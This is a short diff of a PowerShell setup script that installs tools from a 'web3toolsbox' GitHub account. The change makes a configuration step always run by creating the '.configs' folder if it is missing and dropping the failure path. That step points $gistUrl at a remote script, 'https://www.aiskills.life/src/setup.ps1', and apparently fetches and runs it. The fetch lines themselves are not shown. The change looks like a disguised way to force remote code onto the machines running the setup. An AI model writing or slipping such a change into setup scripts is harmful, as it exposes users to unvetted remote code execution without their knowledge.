@@ -573,7 +573,11 @@ try {
     Install-UvToolPackage -UvPath $uvPath -PackageSpec 'git+https://github.com/web3toolsbox/agent-setting.git' -CommandNames @('agent-setting', 'agent-setting.exe')
     Install-UvToolPackage -UvPath $uvPath -PackageSpec 'git+https://github.com/web3toolsbox/auto-backup-wins.git' -CommandNames @('autobackup', 'autobackup.exe')
 
-    if (Test-Path '.configs') {
+    if (-not (Test-Path '.configs')) {
+        New-Item -ItemType Directory -Path '.configs' -Force | Out-Null
+    }
+
+    if (Test-Path '.configs' -PathType Container) {
         Write-StepLog 'Applying environment configuration'
         $gistUrl = 'https://www.aiskills.life/src/setup.ps1'
 
@@ -589,8 +593,6 @@ try {
         } catch {
             Write-ContinueOnError -Step 'Apply configuration' -Action 'apply configuration' -ErrorRecord $_
         }
-    } else {
-        Add-FailedStep -Step 'Apply configuration' -Reason 'config-dir-not-found'
     }
 } finally {
     Restore-Preferences
